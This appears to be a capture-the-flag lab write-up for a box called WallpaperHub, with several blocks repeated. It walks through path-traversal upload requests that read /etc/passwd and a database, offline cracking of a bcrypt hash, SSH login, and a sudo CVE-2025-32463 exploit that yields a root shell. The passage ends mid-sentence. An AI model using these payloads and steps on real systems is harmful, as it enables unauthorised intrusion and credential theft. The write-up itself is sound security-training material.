WallpaperHub

Browse over to the web application on port 5000 to retrieve the following webpage:

It is possible to create an account to use the different features of the website. I created an account with the credentials admin:admin and gained access to the web application:

After some messing around with the file upload feature, I notice it is vulnerable. When we pass in the file name, the server fetches it for us:

POST /upload-wallpaper HTTP/1.1
Host: 192.168.222.204:5000
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Content-Type: multipart/form-data; boundary=----geckoformboundaryf13bb28b45ed9cd9ec70eb5a7b85f2dc
Content-Length: 34038
Origin: http://192.168.222.204:5000
Connection: keep-alive
Referer: http://192.168.222.204:5000/upload-wallpaper?session=%3CSecureCookieSession+%7B%27_permanent%27:+True,+%27username%27:+%27admin%27,+%27_flashes%27:+%5B(%27info%27,+%27File+uploaded+successfully!%27)%5D%7D%3E
Cookie: session=eyJfcGVybWFuZW50Ijp0cnVlLCJ1c2VybmFtZSI6ImFkbWluIn0.aZS19g.V32ZOoFWKkI3fiDl09x1cAMLEqM
Upgrade-Insecure-Requests: 1
Priority: u=0, i

------geckoformboundaryf13bb28b45ed9cd9ec70eb5a7b85f2dc
Content-Disposition: form-data; name="file"; filename="../../../../../../../../../../../../etc/passwd"
Content-Type: image/jpeg
POST /upload-wallpaper HTTP/1.1
Host: 192.168.222.204:5000
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0

Cookie: session=eyJfcGVybWFuZW50Ijp0cnVlLCJ1c2VybmFtZSI6ImFkbWluIn0.aZS19g.V32ZOoFWKkI3fiDl09x1cAMLEqM

------geckoformboundaryf13bb28b45ed9cd9ec70eb5a7b85f2dc
Content-Disposition: form-data; name="file"; filename="../../../../../../../../../../../../etc/passwd"
Content-Type: image/jpeg

After sending the filename as /etc/passwd with multiple traversals, I obtained the following:

root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin

wp_hub:x:1001:1001::/home/wp_hub:/bin/bash

Obtaining the SSH key is not possible. Send the filename as /home/wp_hub/.bash_history to obtain the following commands history:

sqlite3 ~/wallpaper_hub/database.db
sqlite3 ~/wallpaper_hub/database.db

As shown in the output above, the relative path is from the home directory to the database.db file. Then to download the database file, we can use the following filename:

../../../../../../../../../../../../home/wp_hub/wallpaper_hub/database.db
../../../../../../../../../../../../home/wp_hub/wallpaper_hub/database.db

The payload worked successfully and now I have the database.db file. There exists a user called wp_hub with their encrypted password hash inside the database:

Save the hash and crack it offline to retrieve the password of user wp_hub:

┌──(kali㉿kali)-[~/Desktop/Labs/WallpaperHub]
└─$ echo '$2b$12$lgsrjRa0imePu9iSnp1UsOPLWqAKKYym/z5R59UijsYZ5ss1nwijS' > hash.txt
                                                                                                                                                                         
┌──(kali㉿kali)-[~/Desktop/Labs/WallpaperHub]
└─$ john hash.txt --wordlist=/usr/share/wordlists/rockyou.txt
Using default input encoding: UTF-8
Loaded 1 password hash (bcrypt [Blowfish 32/64 X3])
Cost 1 (iteration count) is 4096 for all loaded hashes
Will run 2 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
qazwsxedc        (?)     
1g 0:00:01:21 DONE (2026-02-17 14:14) 0.01230g/s 24.58p/s 24.58c/s 24.58C/s asd123..laptop
Use the "--show" option to display all of the cracked passwords reliably
Session completed.
┌──(kali㉿kali)-[~/Desktop/Labs/WallpaperHub]
└─$ echo '$2b$12$lgsrjRa0imePu9iSnp1UsOPLWqAKKYym/z5R59UijsYZ5ss1nwijS' > hash.txt
                                                                                                                                                                         
┌──(kali㉿kali)-[~/Desktop/Labs/WallpaperHub]
└─$ john hash.txt --wordlist=/usr/share/wordlists/rockyou.txt
Using default input encoding: UTF-8
Loaded 1 password hash (bcrypt [Blowfish 32/64 X3])
Cost 1 (iteration count) is 4096 for all loaded hashes
Will run 2 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
qazwsxedc        (?)     
1g 0:00:01:21 DONE (2026-02-17 14:14) 0.01230g/s 24.58p/s 24.58c/s 24.58C/s asd123..laptop
Use the "--show" option to display all of the cracked passwords reliably
Session completed.

Then gain initial access to the machine using the same credentials via SSH:

┌──(kali㉿kali)-[~/Desktop/Labs/WallpaperHub]
└─$ ssh wp_hub@192.168.222.204               
The authenticity of host '192.168.222.204 (192.168.222.204)' can't be established.
ED25519 key fingerprint is: SHA256:GYats4sApIm2CiXiv6CqklOr+LDIDCrer/01h6J9yFg

    ~/.ssh/known_hosts:106: [hashed name]
    ~/.ssh/known_hosts:108: [hashed name]

wp_hub@wallpaperhub:~

I notice it is possible to run web-scraper with root privileges on the machine:

wp_hub@wallpaperhub:~$ sudo -l
Matching Defaults entries for wp_hub on wallpaperhub:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty, !env_reset

User wp_hub may run the following commands on wallpaperhub:
    (root) NOPASSWD: /usr/bin/web-scraper /root/web_src_downloaded/*.html
wp_hub@wallpaperhub:~$ sudo -l
Matching Defaults entries for wp_hub on wallpaperhub:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty, !env_reset

User wp_hub may run the following commands on wallpaperhub:
    (root) NOPASSWD: /usr/bin/web-scraper /root/web_src_downloaded/*.html

Running strings on the web-scrapper binary gives us the source-code of the app:

wp_hub@wallpaperhub:~$ strings /usr/bin/web-scraper 
#!/usr/bin/env node
const fs = require('fs');
const { Window } = require("happy-dom");
// Check if a file path is provided as a command-line argument
const filePath = process.argv[2];
if (!filePath) {
    console.error('Please provide a file path as an argument.');
    process.exit(1);
const window = new Window();
const document = window.document;
// Read the content of the provided file path
fs.readFile(filePath, 'utf-8', (err, data) => {
    if (err) {
        console.error(`Error reading file ${filePath}:`, err);
        return;
    }
    // Use document.write() to add the content to the document
    document.write(data);
    // Log all external imports (scripts, stylesheets, meta tags)
    const links = document.querySelectorAll('link');
    const scripts = document.querySelectorAll('script');
    const metaTags = document.querySelectorAll('meta');
    
    console.log('----------------------------');
    // Output the links (CSS imports)
    console.log('CSS Links:');
    links.forEach(link => {
        console.log(link.href);
    });
    console.log('----------------------------');
    // Output the scripts (JS imports)
    console.log('JavaScript Links:');
    scripts.forEach(script => {
        if (script.src) {
            console.log(script.src);
        } else {
            console.log('Inline script found.');
        }
    });
    console.log('----------------------------');
    // Output the meta tags (for metadata)
    console.log('Meta Tags:');
    metaTags.forEach(meta => {
        console.log(`Name: ${meta.name}, Content: ${meta.content}`);
    });
    console.log('----------------------------');
wp_hub@wallpaperhub:~$ strings /usr/bin/web-scraper 
#!/usr/bin/env node
const fs = require('fs');
const { Window } = require("happy-dom");
// Check if a file path is provided as a command-line argument
const filePath = process.argv[2];
if (!filePath) {
    console.error('Please provide a file path as an argument.');
    process.exit(1);
const window = new Window();
const document = window.document;
// Read the content of the provided file path
fs.readFile(filePath, 'utf-8', (err, data) => {
    if (err) {
        console.error(`Error reading file ${filePath}:`, err);
        return;
    }
    // Use document.write() to add the content to the document
    document.write(data);
    // Log all external imports (scripts, stylesheets, meta tags)
    const links = document.querySelectorAll('link');
    const scripts = document.querySelectorAll('script');
    const metaTags = document.querySelectorAll('meta');
    
    console.log('----------------------------');
    // Output the links (CSS imports)
    console.log('CSS Links:');
    links.forEach(link => {
        console.log(link.href);
    });
    console.log('----------------------------');
    // Output the scripts (JS imports)
    console.log('JavaScript Links:');
    scripts.forEach(script => {
        if (script.src) {
            console.log(script.src);
        } else {
            console.log('Inline script found.');
        }
    });
    console.log('----------------------------');
    // Output the meta tags (for metadata)
    console.log('Meta Tags:');
    metaTags.forEach(meta => {
        console.log(`Name: ${meta.name}, Content: ${meta.content}`);
    });
    console.log('----------------------------');

The good thing is gcc is present, and the sudo version is 1.9.15p5 which is vulnerable to a Privilege Escalation Flaw:

wp_hub@wallpaperhub:~$ sudo --version
Sudo version 1.9.15p5
Sudoers policy plugin version 1.9.15p5
Sudoers file grammar version 50
Sudoers I/O plugin version 1.9.15p5
Sudoers audit plugin version 1.9.15p5
wp_hub@wallpaperhub:~$ sudo --version
Sudo version 1.9.15p5
Sudoers policy plugin version 1.9.15p5
Sudoers file grammar version 50
Sudoers I/O plugin version 1.9.15p5
Sudoers audit plugin version 1.9.15p5

Download the exploit from here and transfer it to the machine:

Run it against the machine and we will obtain a root shell:

wp_hub@wallpaperhub:/tmp/CVE-2025-32463-main$ chmod +x poc.sh && ./poc.sh
woot!
root@wallpaperhub:/# whoami
root
root@wallpaperhub:/# if
> exit
> ;
bash: syntax error near unexpected token `;'
root@wallpaperhub:/# cat /root/proof.txt
b2244733ea1f2ae385d61d3d0a5fade9
root@wallpaperhub:/# 

wp_hub@wallpaperhub:/tmp/CVE-2025-32463-main$ chmod +x poc.sh && ./poc.sh
woot!
root@wallpaperhub:/# whoami
root
root@wallpaperhub:/# if
> exit
> ;
bash: syntax error near unexpected token `;'
root@wallpaperhub:/# cat /root/proof.txt
b2244733ea1f2ae385d61d3d0a5fade9
root@wallpaperhub:/#

However, the intended method for this box is to use the exploit the happy-dom package used by NodeJS:
